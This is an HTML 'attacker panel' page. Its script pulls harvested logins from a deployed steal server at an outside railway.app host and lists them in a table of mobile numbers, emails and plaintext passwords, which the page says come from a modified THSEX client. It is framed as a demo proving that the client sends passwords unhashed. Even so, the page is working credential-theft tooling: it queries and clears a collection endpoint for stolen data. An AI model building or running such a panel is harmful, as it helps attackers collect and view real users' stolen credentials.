<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Attacker Panel — Steal Demo</title>
  <style>
    * { box-sizing: border-box; }
    body { font-family: system-ui, sans-serif; background: #0f0f14; color: #eee; margin: 0; padding: 20px; }
    h1 { color: #ff4455; }
    .warn { background: #3a1515; border: 1px solid #ff4455; padding: 12px; border-radius: 8px; margin-bottom: 16px; }
    input { width: 100%; max-width: 480px; padding: 10px; margin: 6px 0 12px; border-radius: 6px; border: 1px solid #444; background: #1a1a22; color: #fff; }
    button { background: #ff4455; color: #fff; border: 0; padding: 10px 16px; border-radius: 6px; cursor: pointer; margin-right: 8px; }
    button.secondary { background: #333; }
    table { width: 100%; border-collapse: collapse; margin-top: 16px; font-size: 13px; }
    th, td { border: 1px solid #333; padding: 8px; text-align: left; vertical-align: top; }
    th { background: #1a1a22; }
    .pwd { color: #ff8888; font-weight: bold; font-family: monospace; }
    .hash { color: #888; font-size: 12px; }
  </style>
</head>
<body>
  <h1>Attacker Panel (Demo)</h1>
  <div class="warn">
    <strong>Proof:</strong> Login passwords from modified THSEX client arrive here in
    <strong>PLAIN TEXT</strong>. Client does not hash before send. Real server hashes on backend only.
  </div>

  <label>Your deployed steal server URL (no trailing slash)</label>
  <input id="apiBase" placeholder="https://web-production-682ba.up.railway.app" value="https://web-production-682ba.up.railway.app" />

  <button onclick="refresh()">Refresh stolen list</button>
  <button class="secondary" onclick="clearAll()">Clear</button>

  <p id="status"></p>
  <table>
    <thead>
      <tr>
        <th>Time (UTC)</th>
        <th>Mobile</th>
        <th>Email</th>
        <th>Password (plain)</th>
        <th>Full payload</th>
      </tr>
    </thead>
    <tbody id="rows"></tbody>
  </table>

  <script>
    const DEFAULT_BASE = 'https://web-production-682ba.up.railway.app';
    const saved = localStorage.getItem('stealApiBase') || DEFAULT_BASE;
    document.getElementById('apiBase').value = saved;

    function base() {
      const v = document.getElementById('apiBase').value.trim().replace(/\/$/, '');
      localStorage.setItem('stealApiBase', v);
      return v;
    }

    async function refresh() {
      const b = base();
      if (!b) { document.getElementById('status').textContent = 'Enter server URL first'; return; }
      document.getElementById('status').textContent = 'Loading...';
      try {
        const r = await fetch(b + '/api/stolen');
        const j = await r.json();
        const tbody = document.getElementById('rows');
        tbody.innerHTML = '';
        (j.data || []).slice().reverse().forEach(row => {
          const p = row.payload || {};
          const tr = document.createElement('tr');
          tr.innerHTML = `
            <td>${row.received_at || ''}</td>
            <td>${row.mobile || p.mobile || p.phone || '-'}</td>
            <td>${row.email || p.email || '-'}</td>
            <td class="pwd">${row.password_plain || p.password || '-'}</td>
            <td><code>${JSON.stringify(p)}</code></td>`;
          tbody.appendChild(tr);
        });
        document.getElementById('status').textContent = 'Total stolen: ' + (j.count || 0);
      } catch (e) {
        document.getElementById('status').textContent = 'Error: ' + e.message;
      }
    }

    async function clearAll() {
      const b = base();
      if (!b) return;
      await fetch(b + '/api/stolen/clear', { method: 'POST' });
      refresh();
    }

    refresh();
  </script>
</body>
</html>
